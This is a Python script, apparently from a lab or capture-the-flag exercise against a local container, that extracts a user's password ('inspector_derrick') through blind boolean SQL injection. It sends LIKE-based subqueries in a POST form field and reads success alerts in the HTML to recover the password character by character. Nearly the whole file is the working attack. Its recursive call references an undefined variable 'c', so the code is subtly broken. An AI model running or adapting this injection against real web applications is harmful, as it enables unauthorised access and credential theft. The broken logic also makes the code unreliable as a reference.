import sys
import requests
from bs4 import BeautifulSoup
import string



addr = "172.17.0.2" if len(sys.argv) > 1 else "127.0.0.1"

url= "http://"+addr+'/messages'



################### Query test if any of the paasword is în any combination of 
############## character set hence the use of the :  like in query



injection_query = '\' or (SELECT count(*) FROM users\
                WHERE users.name = \'inspector_derrick\' AND users.password like'

#################################################################################

################# The pasword is any combination of integer and/or strings ####################
character_set_for_password = string.digits + string.ascii_lowercase 
###################################################################################

def password_hack(password) :  

    '''
    Builds query for injection
    Query is added as payload to post request
    Then we monitor if the password search renders and alert success 
    message

    '''

    hack_query = injection_query + "\'" + password + '%\') > \'0' # query for injection

    hack_injector = {'name': hack_query } # prepare payload 
    request = requests.post(url, data=hack_injector) # request post
    soup = BeautifulSoup(request.content, 'html.parser') # 
    divs = soup.findAll("div", class_="alert alert-success") # return div that generate an alert success message

    # The function returns only if a div with a positie password correspondence is retrieved
    test_evaluator = len(divs) > 0


    return test_evaluator


################3 password_searc ######################################################

def password_search(passed) :

    '''
    search for password that returns true for the pasword search
    input is a character set from ascii ( string/number combination) that was previously defined

    Basically , we search recursively until we return  
    get a div with an alert success; upon which the function returns

    '''
    for character in character_set_for_password : # for each character set

        if (password_hack(passed + character)): # if the result of the password hasck if false continue the search
                                                # we recursively append the previous character to the next. Amd do an exhaustive search

            return password_search(passed + c) # else return the pasword that passes the test and generate success alert

    return passed


#### call passwrd hack function to return the passowrd 

password = password_search('')

print(password)